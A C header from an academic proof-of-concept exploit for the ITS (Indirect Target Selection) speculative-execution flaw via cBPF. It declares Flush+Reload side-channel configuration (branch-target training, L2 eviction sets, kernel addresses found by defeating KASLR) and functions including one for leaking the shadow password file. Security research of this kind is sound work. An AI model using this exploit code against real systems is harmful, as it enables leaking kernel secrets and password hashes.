/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _FLUSH_AND_RELOAD_H_
#define _FLUSH_AND_RELOAD_H_

#include <stdint.h>
#include "targets.h"
#include "../../../common/l2_eviction/evict_l2.h"

struct config {
    int fd_last_mapped_module;

    uint8_t leak_mode;

    uint8_t * fr_buf;
    uint8_t * fr_buf_kern;
    uint8_t * reload_addr;
    uint8_t * secret_addr;
    uint8_t * secret_addr_kern;

    uint8_t * ind_map;
    uint8_t * ind_map_kern;

    uint64_t * ind_secret_addr;
    uint64_t * ind_base_addr;
    uint8_t * gadget_arg;

    uint64_t train_address;
    uint64_t train_target;

    void * evicting_branch;
    void * branch_contention_list[BTB_CONTENTION_SET_SIZE];

    void * ev_set_l2_hook[L2_EVICT_SIZE];
    void * ev_set_l2_entry[L2_EVICT_SIZE];

    // kaslr dependent
    uint8_t * phys_start;
    uint8_t * phys_end;
    uint8_t * text_start;

    uint64_t victim_branch_address;
    uint64_t speculation_target_address;
    uint64_t leak_gadget_address;
    uint64_t mmap_file_hook_address;
    uint64_t mmap_file_hook_first_entry;
    uint64_t base_address_offset;

};

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);

void print_leakage_rate(struct config * cfg, uint64_t iterations);


void set_load_chain_leak_secret(struct config * cfg);
void set_load_chain_touch_fr_buf(struct config * cfg);
void set_load_chain_single_touch(struct config * cfg);

void leak_test_leakage_rate(struct config * cfg);
void leak_dummy_secret(struct config * cfg);
void leak_shadow_file(struct config * cfg, char shadow_symbol);

#endif //_FLUSH_AND_RELOAD_H_
